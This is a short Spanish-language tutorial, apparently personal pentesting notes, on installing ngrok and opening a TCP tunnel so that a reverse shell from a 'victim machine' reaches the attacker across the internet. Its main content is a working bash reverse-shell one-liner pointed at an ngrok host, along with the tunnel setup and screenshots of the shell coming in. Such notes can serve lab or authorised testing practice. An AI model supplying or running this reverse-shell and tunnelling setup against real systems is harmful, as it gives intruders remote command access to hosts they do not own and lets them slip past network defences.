Lo primero será registrarse en ngrok:
![[Pasted image 20240919134820.png]]
Y procedemos con la instalación:
```bash
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
	| sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \
	&& echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
	| sudo tee /etc/apt/sources.list.d/ngrok.list \
	&& sudo apt update \
	&& sudo apt install ngrok
```
Y luego ejecutamos el siguiente comando:
```bash
ngrok config add-authtoken token # Sustituir esto último
```
Y ahora desde la máquina atacante ejecutamos este comando para recibir conexiones a nuestro puerto 4444:
```bash
ngrok tcp 4444
```
Y nos saldrá lo siguiente:
![[Pasted image 20240919135000.png]]
Una vez hecho esto, desde la máquina víctima ya podemos lanzar la reverse shell:
```bash
bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/15520 0>&1
```
Y la recibimos:
![[Pasted image 20240919135116.png]]
![[Pasted image 20240919135104.png]]
